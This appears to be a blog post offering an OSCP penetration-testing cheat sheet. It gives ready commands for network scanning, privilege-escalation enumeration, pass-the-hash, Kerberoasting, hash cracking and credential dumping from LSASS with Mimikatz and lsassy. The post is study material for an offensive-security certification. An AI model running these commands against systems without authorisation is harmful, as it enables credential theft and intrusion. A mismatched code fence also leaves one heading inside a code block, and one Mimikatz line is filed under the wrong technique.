+++
title = 'OSCP Cheat Sheet Overview'
date = 2024-09-03T17:07:38-07:00
+++

## Introduction

The Offensive Security Certified Professional (OSCP) certification is a benchmark in the field of penetration testing. This guide is designed to be a quick reference, but the journey to OSCP mastery involves a comprehensive commitment beyond what's covered here.

## Network Scanning

### Host Discovery with Nmap

```bash
# Default probe options, show only online hosts
nmap $RHOST/24 -vv -n -sn -T4

# Extra probes (need root)
nmap $RHOST/24 -vv -n -sn -T4 -PE -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 --source-port 53
```

### Port Scanning

```sh
# Full TCP scan with OS detection and service/version detection
sudo nmap $RHOST -vv --reason --open -T4 -Pn -p- -A --version-all --osscan-guess -oN full_tcp_nmap.txt

# Quick scan of the top 20 ports
sudo nmap $RHOST -vv --reason --open -T4 -Pn --top-ports 20

# Adjust scan speed
sudo nmap -vv --reason -Pn --min-rate=1000 -p- $IP
```

### Automated Scanning with AutoRecon

```sh
# Run AutoRecon with common extensions and target timeout
sudo $(which autorecon) -v -o ./ -t targets.txt --dirbuster.ext "/,txt,html,php,asp,aspx,jsp" --target-timeout 20
```

## Attack Vectors 🎯

### Unusual Ports and Services

- Check for Non-default Software: Identify services running on non-standard ports and check for public exploits.
- Old Versions: Even if the software version is new, exploits for older versions may still work. Use Searchsploit or Windows Exploit Suggester.

### Usernames & Passwords

- Default Credentials: Check for default passwords.
- Password Reuse: Look for reused or weak passwords.
- Web Login Forms: Attempt basic credentials like admin:admin or root:(no password).

### Web Application Attacks

- Admin Panels: Weak passwords, code execution via cron jobs, or public exploits.
- SQL Injection (SQLi): Test for SQL injection vulnerabilities.
- File Uploads: Test for unrestricted file uploads leading to remote code execution.

## Privilege Escalation

### Linux Privilege Escalation

```sh
# System enumeration
file /bin/bash
cat /etc/*-release
uname -a
hostname

# Check for other users
grep -vE "nologin|false" /etc/passwd

# Writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
ls -lah /etc/cron*
cat /etc/crontab
```

### Windows Privilege Escalation

```sh
# User and group information
whoami /all
net user
net group "Domain Admins" /domain
hostname

# System and network information
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
ipconfig /all
route print
```

### Automated Enumeration Tools

- LinPEAS: ./linpeas.sh -q | tee linpeas.ansi
- WinPEAS: winpeas.exe
- PowerUp: powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

## Lateral Movement

### Pass the Hash

````sh
# Using Impacket's psexec
impacket-psexec -debug 'domain/user@target_ip' -hashes :ntlm_hash

# RDP with Pass the Hash
xfreerdp +clipboard /log-level:DEBUG /d:domain /u:user /v:target_ip /pth:ntlm_hash

### Pass the Ticket

```sh
# Using Mimikatz
sekurlsa::pth /user:user /domain:domain.com /ntlm:ntlm_hash /run:PowerShell.exe

# List Kerberos tickets
klist

# Impacket - use Kerberos ticket for remote command execution
impacket-psexec -k -no-pass domain/user@target_ip -dc-ip domain_controller_ip
````

## Post-Exploitation

### Manual Enumeration

- User Accounts: net user /domain
- Domain Admins: net group "Domain Admins" /domain
- File System Search: dir c:\users /s flag.txt

### Kerberoasting

```sh
# Using Mimikatz
kerberos::ask
kerberos::list /export

# Crack with Hashcat
hashcat -d 1 -m 13100 --force hash.txt /usr/share/wordlists/rockyou.txt
```

### Dumping Creds

```sh
# Dump LSASS process
cme smb target_ip --local-auth -H ntlm_hash -u administrator -M lsassy --sam

# Extract hashes from a dump
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

## Tools and Resources ⚙️

### Essential Tools

- AutoRecon: Automated network reconnaissance.
- LinPEAS/WinPEAS: Privilege escalation scripts.
- Impacket: Collection of Python scripts for pentesting.
- BloodHound: Active Directory enumeration.

### Resources 📚

- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz
- Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
